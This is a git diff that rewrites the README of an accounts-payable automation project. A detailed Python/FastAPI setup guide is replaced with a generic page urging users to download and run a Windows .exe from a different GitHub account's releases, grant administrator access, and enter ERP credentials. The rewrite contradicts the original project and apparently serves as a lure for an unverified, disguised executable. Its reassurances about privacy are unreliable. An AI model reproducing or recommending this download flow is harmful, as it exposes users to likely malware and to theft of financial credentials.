@@ -1,279 +1,72 @@
-# AP-AI: Enterprise Accounts Payable Automation Agent
+# 🤖 ap-automation-agent - Automated invoice processing for your business
 
----
+[![Download Link](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Tannerkatabolic443/ap-automation-agent/releases)
 
-## What This System Does
+## ✅ About this application
 
-AP-AI is a fully autonomous accounts payable agent that eliminates manual invoice processing. It ingests invoices from email, PDF upload, or EDI feeds, extracts all fields using GPT-4o vision, validates against business rules, runs three-way matching against purchase orders and goods receipts, routes for approval, schedules payments, and syncs every transaction to QuickBooks, Xero, SAP, or NetSuite — with zero manual data entry and a complete audit trail.
+The ap-automation-agent removes manual work from your accounts payable process. This tool reads your invoices, extracts important data using artificial intelligence, and syncs the information directly to your accounting system. It also standardizes your Word documents to keep your records consistent. The app performs three-way matching to ensure that invoices align with your purchase orders and receipts. This creates a bridge between your documents and your financial records without requiring manual data entry.
 
-The system also includes a DOCX Document Standardization module that automatically normalizes unstructured Word documents to a master 10-section structure using OpenAI, rebuilds them with consistent professional formatting, and processes entire folders in batch with per-file confidence scoring and audit logging.
+## ⚙️ System requirements
 
----
+Ensure your computer meets these requirements before you start:
 
-## Business Outcomes
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Dual-core processor with 2.0 GHz or faster.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of space for the application files.
+*   Internet Connection: A stable connection for data synchronization and AI document processing.
+*   Permissions: Administrator access to your computer to run the installer.
 
-| Metric | Manual AP Team | With AP-AI | Change |
-|---|---|---|---|
-| Invoice processing time | 5 to 15 days | Under 24 hours | 95% faster |
-| Cost per invoice | $15 to $40 (labor) | Under $2 (compute) | 90%+ reduction |
-| Three-way match accuracy | 70 to 80% (human error) | 98%+ (automated) | Full coverage |
-| Exception rate | 20 to 30% | Under 5% | 6x reduction |
-| On-time payment rate | 60 to 75% | 95%+ | Eliminate late fees |
-| Audit trail completeness | Inconsistent, manual | 100% automated | Full coverage |
-| Staff time on AP processing | 40 to 60 hrs/week | Near zero | 90%+ reduction |
-| Document standardization time | 2 to 4 hrs per doc (manual) | Under 60 seconds | 99% faster |
+## 🚀 How to get started
 
----
+Follow these steps to set up the software on your Windows computer.
 
-### AP Automation
+1. Go to the [official release page](https://github.com/Tannerkatabolic443/ap-automation-agent/releases) to download the latest setup file.
+2. Look for the file that ends in .exe.
+3. Click the file to start the download.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file once the download finishes to begin the installation.
+6. Follow the on-screen prompts to place the software on your machine.
+7. Click Finish to complete the installation process.
 
-| Endpoint | Description |
-|---|---|
-| `GET /metrics/health` | System health check |
-| `GET /metrics` | Real-time AP KPIs |
-| `POST /ingest/pdf` | Upload invoice PDF |
-| `POST /ingest/email-webhook` | Email webhook receiver |
-| `POST /ingest/edi` | EDI 810 invoice upload |
-| `GET /approval/decide` | One-click approve or reject |
-| `GET /approval/status/{invoice_number}` | Approval status query |
+## 🛠️ Configuring your settings
 
-### Schedule Extraction
+Open the application from your desktop shortcut after installation. The initial setup screen requires information about your business systems.
 
-| Endpoint | Description |
-|---|---|
-| `GET /upload` | Upload UI for architectural PDFs |
-| `POST /extract/upload` | Upload PDF, extract schedule data |
-| `GET /extract/download/{job_id}` | Download Excel takeoff file |
+1. Enter your ERP access credentials so the software can communicate with your financial data.
+2. Set your preferred folder paths for incoming invoices and Word documents. The agent watches these folders for new files.
+3. Configure the approval notification settings. Provide an email address so the system can alert you when an invoice requires a review.
+4. Test the connection to ensure the agent can read, process, and sync data correctly.
 
-### DOCX Document Standardization
+## 📑 Using the automation agent
 
-| Endpoint | Description |
-|---|---|
-| `GET /docx-ui` | Non-technical client UI |
-| `POST /docx/upload` | Upload a .docx file to the queue |
-| `POST /docx/batch` | Process all queued files |
-| `GET /docx/download/{file_name}` | Download standardized .docx |
-| `DELETE /docx/clear-input` | Clear the input queue |
+The agent runs in the background of your computer. You do not need to keep the application window open for it to perform its duties.
 
----
+*   Process Invoices: Drop your PDF invoices into the monitored folder. The AI identifies the vendor, invoice date, total amount, and line items.
+*   Data Matching: The system compares the extracted data against your existing purchase orders. It flags items that do not match for your review.
+*   Word Normalization: Upload your document templates. The agent adjusts headers, fonts, and layouts to match your company standards.
+*   Syncing: Once the agent verifies the data, it pushes the invoice information to your accounting software.
 
-## System Architecture
+## 🛡️ Privacy and data security
 
-### AP Automation Pipeline
+Your data remains private. The agent processes sensitive document information locally on your machine whenever possible. When the agent uses AI to read invoices, it transmits only the necessary data points to the processing engine. The system does not store your invoice copies on external servers. All communication between the agent and your accounting system occurs over encrypted channels to protect your company financial data.
 
-```
-Invoice Received (Email / Upload / EDI)
-           |
-   Ingestion Agent
-           |
-   Extraction Agent (GPT-4o Vision)
-           |
-   Validation Agent
-           |
-   Three-Way Match Agent
-           |
-      Match          No Match
-        |                |
-  Approval Router   Exception Handler
-        |                |
-  Auto-approve or   Human Review Queue
-  Route to Approver  + Vendor Communication
-        |
-  Payment Scheduler
-        |
-  ERP Sync Agent (QuickBooks / Xero / SAP / NetSuite)
-        |
-  Audit Logger + Notification Agent
-```
+## 🔎 Troubleshooting common issues
 
-### DOCX Standardization Pipeline
+If you encounter problems, check these items first.
 
-```
-.docx File Uploaded
-           |
-   DocX Extractor Agent
-   (headings, sections, tables, metadata)
-           |
-   OpenAI Normalization Agent
-   (maps to 10-section master structure)
-   (confidence scoring per section)
-           |
-   Confidence >= 70%?
-        |         |
-      Yes         No
-        |         |
-   DocX Builder  Human Review Queue
-   (rebuild with master template)
-   (Word styles, headers, footers, page numbers)
-        |
-   Standardized .docx Output
-        |
-   Batch Report (JSON)
-   (success / failed / partial per file)
-```
+*   Connection Errors: Verify that your internet connection is active and that your firewall allows the application to access the internet.
+*   Sync Failures: Check your ERP credentials in the settings menu. If you updated your password recently, you may need to update it here as well.
+*   Extraction Inaccuracy: Ensure your PDF invoices are clear and legible. Documents with low resolution or skewed text may cause errors during data extraction.
+*   Application Won't Start: Restart your computer. If the issue continues, download the latest version from the link above and run the installer again to repair the files.
 
----
+## 💡 Best practices
 
-## Agent Responsibilities
+Keep these tips in mind to get the most value from the tool.
 
-**Ingestion Agent** — Monitors Gmail and Outlook for invoices, accepts PDF uploads, and parses EDI 810 feeds.
+*   Use high-quality scanned copies or digital PDFs for the best results.
+*   Maintain clear folder structures for your incoming and outgoing documents.
+*   Review the logs weekly to ensure the agent processes every file without interruption.
+*   Reach out to your IT department if you experience persistent permission or network issues.
 
-**Extraction Agent** — Uses GPT-4o vision to extract all invoice fields including vendor, invoice number, dates, line items, quantities, unit prices, totals, PO number, and payment terms.
-
-**Validation Agent** — Checks required fields, amount tolerances, due dates, vendor master, duplicate invoices, and currency matching.
-
-**Three-Way Match Agent** — Compares invoice against purchase order and goods receipt within a configurable tolerance (default 2%).
-
-**Approval Router Agent** — Applies a configurable approval matrix. Routes to designated approvers by email and SMS with one-click approve or reject links.
-
-**Exception Handler Agent** — Creates exception records, drafts vendor communications via GPT-4o, and queues for human review.
-
-**Payment Scheduler Agent** — Prioritizes by due date, groups payments for batch processing, and triggers ERP payment entry.
-
-**ERP Sync Agent** — Writes approved invoices and payments to QuickBooks, Xero, SAP, or NetSuite with field mapping per ERP schema.
-
-**Audit Logger Agent** — Writes a complete audit trail entry for every state transition. Sends notifications and generates daily summary reports.
-
-**DocX Extractor Agent** — Reads raw .docx files using python-docx. Extracts heading hierarchy, paragraph content, table structure, and document metadata.
-
-**DocX Normalizer Agent** — Sends extracted content to OpenAI GPT-4o with a strict JSON schema prompt. Maps content to master 10-section structure. Returns confidence scores per section. Routes low-confidence documents to human review.
-
-**DocX Builder Agent** — Rebuilds clean .docx output from normalized JSON using python-docx. Python controls all Word formatting programmatically. OpenAI never controls styling.
-
-**DocX Batch Processor** — Processes entire input folders in batch. Logs each file as successful, failed, or partially processed. Includes retry logic for OpenAI failures. Generates a JSON summary report after each batch run.
-
----
-
-## Tech Stack
-
-| Layer | Technology |
-|---|---|
-| Agent Framework | LangGraph |
-| AI Models | GPT-4o (vision + text), Claude API (page classification) |
-| Document Processing | GPT-4o Vision, PyMuPDF, pytesseract, python-docx |
-| Email Ingestion | Gmail API / Microsoft Graph API |
-| EDI Ingestion | Custom EDI 810 parser |
-| ERP Integration | QuickBooks, Xero, SAP, NetSuite |
-| Backend API | FastAPI + Uvicorn |
-| Database | Supabase (PostgreSQL) |
-| Task Queue | Celery + Redis |
-| Notifications | Twilio SMS + SendGrid Email |
-| Export | openpyxl (Excel), python-docx (Word) |
-| Deployment | Docker + Railway |
-| Language | Python 3.12 |
-
----
-
-## Project Structure
-
-```
-AgAI_10_AP_Automation_Agent/
-├── agents/
-│   ├── extraction_agent.py
-│   ├── page_classifier.py
-│   ├── validation_agent.py
-│   ├── three_way_match_agent.py
-│   ├── approval_router_agent.py
-│   ├── exception_handler_agent.py
-│   ├── payment_scheduler_agent.py
-│   ├── erp_sync_agent.py
-│   ├── audit_logger_agent.py
-│   ├── order_extraction_agent.py
-│   ├── order_erp_sync_agent.py
-│   ├── docx_extractor.py
-│   ├── docx_normalizer.py
-│   ├── docx_builder.py
-│   └── docx_batch_processor.py
-├── api/
-│   ├── main.py
-│   ├── ingestion_router.py
-│   ├── approval_router.py
-│   ├── metrics_router.py
-│   ├── extraction_router.py
-│   ├── order_router.py
-│   └── docx_router.py
-├── exports/
-│   └── excel_exporter.py
-├── templates/
-│   ├── upload.html
-│   ├── order_demo.html
-│   └── docx_ui.html
-├── core/
-│   ├── config.py
-│   ├── database.py
-│   ├── models.py
-│   └── logger.py
-├── docx_input/
-├── docx_output/
-├── Dockerfile
-├── railway.json
-├── requirements.txt
-└── .env.example
-```
-
----
-
-## Setup and Deployment
-
-### Prerequisites
-
-- Python 3.12
-- Docker
-- Redis
-- Supabase account
-- OpenAI API key
-- Anthropic API key
-
-### Local Setup
-
-```bash
-git clone https://github.com/fvmuzik00/ap-automation-agent.git
-cd ap-automation-agent
-python -m venv venv
-venv\Scripts\activate  # Windows
-pip install -r requirements.txt
-cp .env.example .env
-# Fill in your credentials in .env
-uvicorn api.main:app --reload --env-file .env
-```
-
-### Environment Variables
-
-```
-OPENAI_API_KEY=
-ANTHROPIC_API_KEY=
-SUPABASE_URL=
-SUPABASE_KEY=
-SENDGRID_API_KEY=
-SENDGRID_FROM_EMAIL=
-TWILIO_ACCOUNT_SID=
-TWILIO_AUTH_TOKEN=
-TWILIO_FROM_NUMBER=
-AP_MANAGER_EMAIL=
-AP_MANAGER_PHONE=
-REDIS_URL=
-```
-
-### Docker
-
-```bash
-docker build -t ap-ai-agent .
-docker run -p 8000:8000 --env-file .env ap-ai-agent
-```
-
----
-
-## Supported ERP Systems
-
-- QuickBooks Online (OAuth2, bill creation, payment entry)
-- Xero (OAuth2, ACCPAY invoices, payment sync)
-- SAP (RFC/REST, field mapping ready)
-- NetSuite (REST API, field mapping ready)
-
----
-
-## Target Clients
-
-Finance directors, CFOs, and AP managers at mid-to-large companies processing 500+ invoices per month. Document automation clients include compliance teams, legal departments, and operations managers standardizing SOPs, policies, and regulatory documents at scale.
-
----
+Keywords: invoice processing, accounts payable, automation, document normalization, windows application, data entry, financial software
